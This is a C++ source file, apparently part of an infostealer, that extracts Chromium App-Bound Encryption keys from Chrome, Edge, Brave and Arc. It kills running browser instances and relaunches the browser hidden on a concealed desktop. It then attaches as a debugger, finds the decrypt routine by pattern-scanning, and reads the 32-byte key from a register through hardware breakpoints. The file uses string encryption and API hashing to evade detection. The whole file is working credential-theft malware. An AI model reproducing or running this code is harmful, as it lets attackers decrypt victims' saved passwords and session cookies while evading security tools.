//shoutout to PTCruiser for the help, and Meckazin for ChromeKatz (i love pasting)

#include <chromium/abe.hpp>
#include <windows.h>
#include <tlhelp32.h>
#include <cstdint>
#include <string>
#include <vector>
#include <unordered_map>
#include <obfuscation/api_hash.hpp>
#include <obfuscation/iat_proxy.hpp>
#include <crypto_utils/skCrypter.hpp>

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

typedef NTSTATUS (NTAPI* pfn_NtGetNextThread)(HANDLE, HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);

namespace abe {

struct Browser {
    const char*    path_hint;
    const char*    exe_regkey;     //App Paths key name, nullptr if none
    const wchar_t* exe_fallback;   //may contain %env% vars
    const wchar_t* module;         //chrome.dll or msedge.dll
    bool           r14;            //false = R15 (chrome/brave), true = R14 (edge)
};

//keep order! more specific entries first (sxs before chrome, edge channels before edge stable)
//runtime init so skcrypt can be used
static const std::vector<Browser>& get_browsers() {
    static const std::vector<Browser> v = {
        { skCrypt("Microsoft\\Edge SxS"),
          nullptr,
          skCrypt(L"%LOCALAPPDATA%\\Microsoft\\Edge SxS\\Application\\msedge.exe"),
          skCrypt(L"msedge.dll"), true },
        { skCrypt("Microsoft\\Edge Beta"),
          nullptr,
          skCrypt(L"C:\\Program Files (x86)\\Microsoft\\Edge Beta\\Application\\msedge.exe"),
          skCrypt(L"msedge.dll"), true },
        { skCrypt("Microsoft\\Edge Dev"),
          nullptr,
          skCrypt(L"C:\\Program Files (x86)\\Microsoft\\Edge Dev\\Application\\msedge.exe"),
          skCrypt(L"msedge.dll"), true },
        { skCrypt("Microsoft\\Edge"),
          skCrypt("msedge.exe"),
          skCrypt(L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"),
          skCrypt(L"msedge.dll"), true },
        { skCrypt("Brave-Browser-Nightly"),
          nullptr,
          skCrypt(L"C:\\Program Files\\BraveSoftware\\Brave-Browser-Nightly\\Application\\brave.exe"),
          skCrypt(L"chrome.dll"), false },
        { skCrypt("Brave-Browser-Beta"),
          nullptr,
          skCrypt(L"C:\\Program Files\\BraveSoftware\\Brave-Browser-Beta\\Application\\brave.exe"),
          skCrypt(L"chrome.dll"), false },
        { skCrypt("BraveSoftware"),
          skCrypt("brave.exe"),
          skCrypt(L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"),
          skCrypt(L"chrome.dll"), false },
        { skCrypt("Arc\\User Data"),
          nullptr,
          skCrypt(L"%LOCALAPPDATA%\\Programs\\Arc\\Arc.exe"),
          skCrypt(L"chrome.dll"), false },
        { skCrypt("Google\\Chrome SxS"),
          skCrypt("chrome.exe"),
          skCrypt(L"%LOCALAPPDATA%\\Google\\Chrome SxS\\Application\\chrome.exe"),
          skCrypt(L"chrome.dll"), false },
        { skCrypt("Google\\Chrome"),
          skCrypt("chrome.exe"),
          skCrypt(L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"),
          skCrypt(L"chrome.dll"), false },
    };
    return v;
}

//"OSCrypt.AppBoundProvider.Decrypt.ResultCode\0"
static const uint8_t TARGET_STR[] = {
    0x4f,0x53,0x43,0x72,0x79,0x70,0x74,0x2e,0x41,0x70,0x70,0x42,0x6f,0x75,0x6e,0x64,
    0x50,0x72,0x6f,0x76,0x69,0x64,0x65,0x72,0x2e,0x44,0x65,0x63,0x72,0x79,0x70,0x74,
    0x2e,0x52,0x65,0x73,0x75,0x6c,0x74,0x43,0x6f,0x64,0x65,0x00
};

static std::wstring find_exe(const Browser& b) {
    if (b.exe_regkey) {
        std::string rp = std::string(skCrypt("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\"))
                       + b.exe_regkey;
        char buf[MAX_PATH] = {};
        DWORD sz = sizeof(buf);
        //try HKLM then HKCU
        if (RegGetValueA(HKEY_LOCAL_MACHINE, rp.c_str(), nullptr, RRF_RT_REG_SZ, nullptr, buf, &sz) == ERROR_SUCCESS ||
            RegGetValueA(HKEY_CURRENT_USER,  rp.c_str(), nullptr, RRF_RT_REG_SZ, nullptr, buf, &sz) == ERROR_SUCCESS) {
            if (sz > 1) {
                int n = MultiByteToWideChar(CP_ACP, 0, buf, -1, nullptr, 0);
                std::wstring r(n - 1, 0);
                MultiByteToWideChar(CP_ACP, 0, buf, -1, &r[0], n);
                return r;
            }
        }
    }
    //expand env vars in fallback
    wchar_t expanded[MAX_PATH];
    if (ExpandEnvironmentStringsW(b.exe_fallback, expanded, MAX_PATH))
        return expanded;
    return b.exe_fallback;
}

static bool read_section(HANDLE hProc, uintptr_t base, const char* name,
                         uintptr_t& sec_base, DWORD& sec_size) {
    IMAGE_DOS_HEADER dos{};
    IMAGE_NT_HEADERS64 nt{};
    SIZE_T n;
    if (!iat::read_process_mem(hProc, (LPCVOID)base, &dos, sizeof(dos), &n)) return false;
    if (!iat::read_process_mem(hProc, (LPCVOID)(base + dos.e_lfanew), &nt, sizeof(nt), &n)) return false;

    for (int i = 0; i < nt.FileHeader.NumberOfSections; i++) {
        int off = dos.e_lfanew + (int)sizeof(IMAGE_NT_HEADERS64) + i * (int)sizeof(IMAGE_SECTION_HEADER);
        IMAGE_SECTION_HEADER sh{};
        if (!iat::read_process_mem(hProc, (LPCVOID)(base + off), &sh, sizeof(sh), &n)) continue;
        char sname[9] = {};
        memcpy(sname, sh.Name, 8);
        if (_stricmp(sname, name) == 0) {
            sec_base = base + sh.VirtualAddress;
            sec_size = sh.Misc.VirtualSize ? sh.Misc.VirtualSize : sh.SizeOfRawData;
            return true;
        }
    }
    return false;
}

static uintptr_t find_string(HANDLE hProc, uintptr_t base) {
    uintptr_t sec_base; DWORD sec_size;
    if (!read_section(hProc, base, skCrypt(".rdata"), sec_base, sec_size)) return 0;

    std::vector<uint8_t> buf(sec_size);
    SIZE_T n;
    if (!iat::read_process_mem(hProc, (LPCVOID)sec_base, buf.data(), sec_size, &n)) return 0;

    for (size_t i = 0; i + sizeof(TARGET_STR) <= n; i++) {
        if (memcmp(buf.data() + i, TARGET_STR, sizeof(TARGET_STR)) == 0)
            return sec_base + i;
    }
    return 0;
}

static uintptr_t find_xref(HANDLE hProc, uintptr_t base, uintptr_t target) {
    uintptr_t sec_base; DWORD sec_size;
    if (!read_section(hProc, base, skCrypt(".text"), sec_base, sec_size)) return 0;

    std::vector<uint8_t> buf(sec_size);
    SIZE_T n;
    if (!iat::read_process_mem(hProc, (LPCVOID)sec_base, buf.data(), sec_size, &n)) return 0;

    //scan for: 48 8D 0D [disp32]  (LEA RCX, [rip+disp32])
    const size_t ilen = 7;
    for (size_t i = 0; i + ilen <= n; i++) {
        if (buf[i] != 0x48 || buf[i+1] != 0x8D || buf[i+2] != 0x0D) continue;
        int32_t disp;
        memcpy(&disp, buf.data() + i + 3, 4);
        uint64_t resolved = (uint64_t)(sec_base + i) + ilen + (int64_t)disp;
        if (resolved == (uint64_t)target)
            return (uintptr_t)(sec_base + i);
    }
    return 0;
}

static pfn_NtGetNextThread get_NtGetNextThread() {
    static auto fn = (pfn_NtGetNextThread)
        api_hash::get_proc(api_hash::get_module(api_hash::hash("ntdll.dll")),
                           api_hash::hash("NtGetNextThread"));
    return fn;
}

static void hwbp_all_threads(HANDLE hProc, uintptr_t addr, bool clear) {
    auto NtNextThread = get_NtGetNextThread();
    if (!NtNextThread) return;

    HANDLE ht = nullptr;
    for (;;) {
        HANDLE hn = nullptr;
        if (!NT_SUCCESS(NtNextThread(hProc, ht, THREAD_ALL_ACCESS, 0, 0, &hn))) {
            if (ht) CloseHandle(ht);
            break;
        }
        if (ht) CloseHandle(ht);

        if (SuspendThread(hn) != (DWORD)-1) {
            CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            if (GetThreadContext(hn, &ctx)) {
                if (clear) {
                    ctx.Dr0 = 0; ctx.Dr7 = 0; ctx.Dr6 = 0;
                } else {
                    ctx.Dr0 = addr; ctx.Dr7 = 1ull; ctx.Dr6 = 0;
                }
                SetThreadContext(hn, &ctx);
            }
            ResumeThread(hn);
        }
        ht = hn;
    }
}

static void hwbp_on_thread(DWORD tid, uintptr_t addr) {
    HANDLE th = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    if (!th) return;
    if (SuspendThread(th) != (DWORD)-1) {
        CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (GetThreadContext(th, &ctx)) {
            ctx.Dr0 = addr; ctx.Dr7 = 1ull; ctx.Dr6 = 0;
            SetThreadContext(th, &ctx);
        }
        ResumeThread(th);
    }
    CloseHandle(th);
}

static bool read_key(HANDLE hProc, uintptr_t reg_val, uint8_t* key) {
    //reg holds a pointer to the key pointer
    uintptr_t ptr = 0;
    SIZE_T n;
    if (!iat::read_process_mem(hProc, (LPCVOID)reg_val, &ptr, sizeof(ptr), &n) || !ptr) return false;
    if (!iat::read_process_mem(hProc, (LPCVOID)ptr, key, 32, &n)) return false;
    return n == 32;
}

//kill all running processes with matching exe filename 
static void kill_by_name(const wchar_t* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (h) { TerminateProcess(h, 0); CloseHandle(h); }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    Sleep(600); //let child processes fully exit before we spawn fresh
}

static std::vector<BYTE> run_debug_loop(const std::wstring& exe, const wchar_t* module, bool r14) {
    //kill any running instances first. if existing instance is running, spawned process
    const wchar_t* exe_name = wcsrchr(exe.c_str(), L'\\');
    exe_name = exe_name ? exe_name + 1 : exe.c_str();
    kill_by_name(exe_name);

    //hidden desktop. chrome / edge shouldnt be visible to user.
    HDESK hDesk = CreateDesktopW(skCrypt(L"__cuba_abe"), nullptr, nullptr, 0, GENERIC_ALL, nullptr);

    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (hDesk) si.lpDesktop = skCrypt(L"__cuba_abe");

    PROCESS_INFORMATION pi{};

    //CREATE_SUSPENDED so we can attach before any code runs
    if (!CreateProcessW(exe.c_str(), nullptr, nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        if (hDesk) CloseDesktop(hDesk);
        return {};
    }

    ResumeThread(pi.hThread);

    if (!iat::dbg_active_proc(pi.dwProcessId)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        if (hDesk) CloseDesktop(hDesk);
        return {};
    }

    std::vector<BYTE> key;
    uintptr_t bp_addr = 0;
    bool done = false;
    DEBUG_EVENT ev;

    while (!done && iat::wait_dbg_event(&ev, 15000)) {
        switch (ev.dwDebugEventCode) {
        case CREATE_PROCESS_DEBUG_EVENT:
            if (ev.u.CreateProcessInfo.hFile) CloseHandle(ev.u.CreateProcessInfo.hFile);
            break;

        case LOAD_DLL_DEBUG_EVENT:
            if (ev.u.LoadDll.hFile) CloseHandle(ev.u.LoadDll.hFile);
            if (!bp_addr && ev.u.LoadDll.lpImageName) {
                PVOID name_ptr = nullptr; SIZE_T n;
                ReadProcessMemory(pi.hProcess, ev.u.LoadDll.lpImageName, &name_ptr, sizeof(name_ptr), &n);
                if (name_ptr) {
                    wchar_t dll_name[MAX_PATH]{};
                    ReadProcessMemory(pi.hProcess, name_ptr, dll_name, sizeof(dll_name) - 2, &n);
                    const wchar_t* bn = wcsrchr(dll_name, L'\\');
                    bn = bn ? bn + 1 : dll_name;
                    if (_wcsicmp(bn, module) == 0) {
                        uintptr_t mod_base = (uintptr_t)ev.u.LoadDll.lpBaseOfDll;
                        uintptr_t str_va   = find_string(pi.hProcess, mod_base);
                        if (str_va) bp_addr = find_xref(pi.hProcess, mod_base, str_va);
                        if (bp_addr) hwbp_all_threads(pi.hProcess, bp_addr, false);
                    }
                }
            }
            break;

        case CREATE_THREAD_DEBUG_EVENT:
            if (bp_addr) hwbp_on_thread(ev.dwThreadId, bp_addr);
            break;

        case EXCEPTION_DEBUG_EVENT:
            if (ev.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP && bp_addr) {
                HANDLE th = OpenThread(THREAD_ALL_ACCESS, FALSE, ev.dwThreadId);
                if (th) {
                    CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
                    if (GetThreadContext(th, &ctx)) {
                        uintptr_t reg = r14 ? ctx.R14 : ctx.R15;
                        if (reg) {
                            uint8_t k[32]{};
                            if (read_key(pi.hProcess, reg, k))
                                key.assign(k, k + 32);
                        }
                    }
                    CloseHandle(th);
                }
                hwbp_all_threads(pi.hProcess, bp_addr, true);
                done = true;
            }
            break;

        case EXIT_PROCESS_DEBUG_EVENT:
            done = true;
            break;
        }

        //always DBG_CONTINUE. chrome uses exceptions for normal control flow (ty claude)
        //passing DBG_EXCEPTION_NOT_HANDLED can crash Chrome before it calls the elevator //no clue how to properly fix
        iat::cont_dbg_event(ev.dwProcessId, ev.dwThreadId, DBG_CONTINUE);
    }

    iat::dbg_active_proc_stop(pi.dwProcessId);
    TerminateProcess(pi.hProcess, 0);

    DEBUG_EVENT drain;
    while (iat::wait_dbg_event(&drain, 200))
        iat::cont_dbg_event(drain.dwProcessId, drain.dwThreadId, DBG_CONTINUE);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    if (hDesk) CloseDesktop(hDesk);
    return key;
}

std::vector<BYTE> get_abe_key(const std::string& browser_root) {
    static std::unordered_map<std::string, std::vector<BYTE>> cache;
    auto it = cache.find(browser_root);
    if (it != cache.end()) return it->second;

    const Browser* b = nullptr;
    for (const auto& e : get_browsers()) {
        if (browser_root.find(e.path_hint) != std::string::npos) {
            b = &e; break;
        }
    }
    std::vector<BYTE> key;
    if (b) {
        std::wstring exe = find_exe(*b);
        if (!exe.empty())
            key = run_debug_loop(exe, b->module, b->r14);
    }
    cache[browser_root] = key;
    return key;
}

} //namespace abe
